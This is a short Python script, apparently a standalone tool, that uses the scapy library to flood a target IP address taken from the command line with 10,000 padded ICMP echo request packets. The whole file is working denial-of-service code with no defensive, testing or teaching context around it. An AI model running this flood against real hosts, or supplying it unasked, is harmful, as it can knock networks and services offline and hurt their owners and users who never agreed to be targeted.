from scapy.all import IP, ICMP, send
import sys



def icmp_flood(destination):
    # Generate a high volume of ICMP Echo Request packets
    icmp_pkt = IP(dst=destination) / ICMP() / ("X" * 100)

    # Send packets
    send(icmp_pkt, count=10000, verbose=False)

if __name__=="__main__":
    if len(sys.argv) != 2:
        print("Usage: Python icmp_flood.py <Dst IP>")
        sys.exit(1)
    destination_ip = sys.argv[1]
    icmp_flood(destination_ip)
